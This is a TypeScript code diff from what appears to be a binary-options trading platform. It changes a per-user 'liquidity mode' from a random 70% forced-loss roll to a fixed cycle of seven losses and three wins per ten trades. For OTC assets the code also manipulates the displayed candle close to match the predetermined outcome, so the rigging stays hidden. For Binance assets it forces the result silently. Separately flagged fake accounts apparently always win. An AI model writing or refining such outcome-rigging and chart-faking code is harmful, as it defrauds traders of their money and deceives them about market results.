@@ -6,9 +6,12 @@ import { resolveOperationIfExpired } from './worker.js'
 import { getSettings } from '../settings/service.js'
 import { publishOperationEvent } from './events.js'
 import { assertMarketAllowed, getAssetMarket } from './marketPermissions.js'
-import { markOpForcedLoss, registerLiquiditySignal } from './liquidityManipulation.js'
+import {
+  markOpForcedLoss, markOpForcedWin,
+  registerLiquiditySignal,
+  getNextLiquidityOutcome,
+} from './liquidityManipulation.js'
 
-const LIQUIDITY_LOSS_RATE = 0.7
 const M1_SLOT_MS = 60_000
 
 export async function createOperation(userId: string, input: CreateOperationInput) {
@@ -114,47 +117,80 @@ export async function createOperation(userId: string, input: CreateOperationInpu
     throw new Error('INSUFFICIENT_BALANCE')
   }
 
-  // ── Liquidity-mode roll (per-user "modo liquidez" → 70% loss target).
-  // Decided here at OPEN time so the same op never re-rolls partway
-  // through. If the roll picks "lose":
-  //   - mark opId for the resolver to force LOST regardless of price
-  //   - for OTC assets, ALSO register an opposite-direction signal so
-  //     the candle close is dragged the right way → vela coerente
-  //     instead of "vela verde mas perdeu" mismatch
-  // For Binance assets we don't manipulate (real market), the resolver
-  // still forces loss via the marker — same "silent" outcome as before.
+  // ── Liquidity-mode cycle (per-user "modo liquidez" → 7L+3W per 10 ops).
+  // Replaces the previous Math.random() < 0.7 independent per-op roll.
+  // Each user with liquidityMode=true has a shuffled queue of 10 outcomes
+  // (7 'LOSS' + 3 'WIN'); each call consumes one. When the queue empties,
+  // a fresh shuffle is generated.
+  //
+  // Why deterministic instead of independent rolls: with 70% per-op the
+  // user could see 10 losses in a row by chance; with the cycle the user
+  // sees EXACTLY 7L+3W per 10 ops, but the position of the 3 wins is
+  // unpredictable (Fisher-Yates).
+  //
+  // What we do per outcome:
+  //   LOSS → markOpForcedLoss + (OTC) register signal in OPPOSITE direction
+  //          → vela vermelha quando user CALL, verde quando user PUT
+  //   WIN  → markOpForcedWin  + (OTC) register signal in SAME direction
+  //          → vela verde quando user CALL, vermelha quando user PUT
+  //
+  // For Binance assets we never manipulate the chart (real market) — only
+  // the resolver-side marker fires; vela tica natural.
+  //
+  // isFake users bypass this entirely (their isFake check in the worker
+  // wins regardless), so we skip consuming the cycle when isFake is true
+  // to avoid wasting wins on someone who'd win anyway.
   //
   // Wrapped in try/catch — any failure here NEVER blocks the trade.
-  // Default outcome on failure: skip the roll, op resolves naturally.
+  // Default outcome on failure: skip everything, op resolves naturally.
   try {
     const userPerms = await prisma.user.findUnique({
       where:  { id: userId },
-      select: { liquidityMode: true } as any,
-    }) as { liquidityMode?: boolean } | null
-    if (userPerms?.liquidityMode === true && Math.random() < LIQUIDITY_LOSS_RATE) {
+      select: { liquidityMode: true, isFake: true } as any,
+    }) as { liquidityMode?: boolean; isFake?: boolean } | null
+
+    if (userPerms?.liquidityMode === true && userPerms?.isFake !== true) {
       const opIdStr = String((rows[0] as any).id)
-      markOpForcedLoss(opIdStr)
-      const market = await getAssetMarket({ id: input.assetId, marketSymbol: input.marketSymbol })
-      if (market !== 'crypto') {
-        // OTC path — register the visual nudge. Direction we want the
-        // candle to close = OPPOSITE of what the user bet.
-        const opposite: 'CALL' | 'PUT' = input.direction === 'CALL' ? 'PUT' : 'CALL'
-        const expiresMs = expiresAt.getTime()
-        const slotEndMs = (Math.floor(expiresMs / M1_SLOT_MS) + 1) * M1_SLOT_MS
-        registerLiquiditySignal({
-          opId:        opIdStr,
-          assetId:     input.assetId,
-          direction:   opposite,
-          slotEndMs,
-          expiresAtMs: expiresMs,
-        })
-        console.log(`[liquidity] OTC nudge op=${opIdStr} asset=${input.assetId} dir=${opposite} expiresAt=${new Date(expiresMs).toISOString()}`)
-      } else {
-        console.log(`[liquidity] silent force-loss op=${opIdStr} asset=${input.assetId} (binance)`)
+      const outcome = getNextLiquidityOutcome(userId)
+      const market  = await getAssetMarket({ id: input.assetId, marketSymbol: input.marketSymbol })
+      const expiresMs = expiresAt.getTime()
+      const slotEndMs = (Math.floor(expiresMs / M1_SLOT_MS) + 1) * M1_SLOT_MS
+
+      if (outcome === 'LOSS') {
+        markOpForcedLoss(opIdStr)
+        if (market !== 'crypto') {
+          // Vela coerente: fechar OPOSTO ao que o user apostou para perder.
+          const opposite: 'CALL' | 'PUT' = input.direction === 'CALL' ? 'PUT' : 'CALL'
+          registerLiquiditySignal({
+            opId:        opIdStr,
+            assetId:     input.assetId,
+            direction:   opposite,
+            slotEndMs,
+            expiresAtMs: expiresMs,
+          })
+          console.log(`[liquidity] cycle=LOSS OTC nudge op=${opIdStr} asset=${input.assetId} dir=${opposite}`)
+        } else {
+          console.log(`[liquidity] cycle=LOSS silent force-loss op=${opIdStr} asset=${input.assetId} (binance)`)
+        }
+      } else { // WIN
+        markOpForcedWin(opIdStr)
+        if (market !== 'crypto') {
+          // Vela coerente: fechar IGUAL ao que o user apostou para ganhar.
+          registerLiquiditySignal({
+            opId:        opIdStr,
+            assetId:     input.assetId,
+            direction:   input.direction,   // SAME direction as user's bet
+            slotEndMs,
+            expiresAtMs: expiresMs,
+          })
+          console.log(`[liquidity] cycle=WIN  OTC nudge op=${opIdStr} asset=${input.assetId} dir=${input.direction}`)
+        } else {
+          console.log(`[liquidity] cycle=WIN  silent force-win op=${opIdStr} asset=${input.assetId} (binance)`)
+        }
       }
     }
   } catch (err) {
-    console.error('[liquidity] roll failed (non-fatal — op resolves naturally)', err)
+    console.error('[liquidity] cycle failed (non-fatal — op resolves naturally)', err)
   }
 
   // Resolution is handled by the expiration worker (polls DB every second) —
